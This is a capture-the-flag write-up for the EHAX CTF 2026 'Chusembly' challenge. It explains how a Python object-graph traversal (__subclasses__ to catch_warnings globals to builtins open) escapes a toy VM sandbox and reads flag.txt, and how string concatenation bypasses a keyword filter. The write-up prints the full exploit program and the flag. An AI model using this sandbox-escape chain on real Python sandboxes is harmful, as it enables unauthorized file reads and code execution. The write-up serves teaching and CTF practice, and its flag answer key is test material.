@@ -1,0 +1,118 @@
+===============================================================================
+EHAX CTF 2026 - Chusembly Writeup
+Category: Misc
+Points: 50
+Author: benzo
+===============================================================================
+
+CHALLENGE DESCRIPTION:
+----------------------
+I've created Chusembly - a revolutionary new programming language that's
+totally secure! It has registers, a stack, and everything a real language
+needs.
+
+I even added a safety check so you can't do anything dangerous. The flag is
+sitting right there in flag.txt, but good luck reading it with my restricted
+instruction set.
+
+http://chall.ehax.in:6969/
+
+FILES PROVIDED:
+--------------
+- Remote web runner: http://chall.ehax.in:6969/
+
+SOLUTION:
+---------
+
+1. INITIAL RECONNAISSANCE
+
+   Opened the service and inspected the runner endpoint.
+   `/run` accepts Chusembly code and returns output.
+
+   By submitting `HELP`, the VM exposed the allowed opcodes:
+   - LD, PEEK, POP, PUSH, DEL, ADD, MOV, CMP, IDX, CALL, PROP, END, STDOUT
+
+2. UNDERSTAND THE VM PRIMITIVES
+
+   Probed instruction behavior with small test programs.
+   Important findings:
+   - Valid registers are only A, B, C, D, E
+   - `PROP <name> <reg>` stores `getattr(reg, name)` into register E
+   - `CALL <reg>` executes callable in that register
+   - `DEL` can null out registers and helps control call argument behavior
+
+3. FIND THE SANDBOX WEAKNESS
+
+   Initial register state was not safe. It exposed powerful Python objects:
+   - `<class 'object'>`
+   - `object.__subclasses__`
+
+   That allows object graph traversal to recover dangerous builtins despite
+   the restricted instruction set.
+
+4. BUILD PYTHON OBJECT CHAIN
+
+   Chain used:
+   - `1 -> __class__ -> int`
+   - `int -> __base__ -> object`
+   - `object -> __subclasses__()`
+   - pick index `241` => `warnings.catch_warnings`
+   - `catch_warnings.__init__.__globals__`
+   - dict `get('__builtins__')`
+   - dict `get('open')`
+   - `open(filename).read()`
+
+5. BYPASS THE SAFETY FILTER
+
+   The safety check blocks direct use of `flag` / `flag.txt` as literals.
+   Bypass:
+   - `LD A fla`
+   - `LD B g.txt`
+   - `ADD A B`  -> produces `flag.txt` at runtime
+
+6. FINAL EXPLOIT PAYLOAD
+
+   Submitted this Chusembly program:
+
+   LD A 1
+   PROP __class__ A
+   PROP __base__ E
+   PROP __subclasses__ E
+   DEL A
+   DEL B
+   CALL E
+   PROP pop E
+   LD A 241
+   DEL B
+   CALL E
+   PROP __init__ E
+   PROP __globals__ E
+   PROP get E
+   LD A __builtins__
+   DEL B
+   CALL E
+   PROP get E
+   LD A open
+   DEL B
+   CALL E
+   LD A fla
+   LD B g.txt
+   ADD A B
+   DEL B
+   CALL E
+   PROP read E
+   DEL A
+   DEL B
+   CALL E
+   STDOUT E
+
+7. VERIFY
+
+   The output printed the flag contents from `flag.txt`.
+
+TOOLS USED:
+-----------
+- Browser / curl (service interaction)
+- Python 3 (fast opcode behavior probing)
+
+FLAG: EH4X{chusembly_a1n7_7h47_7uffff_br0}
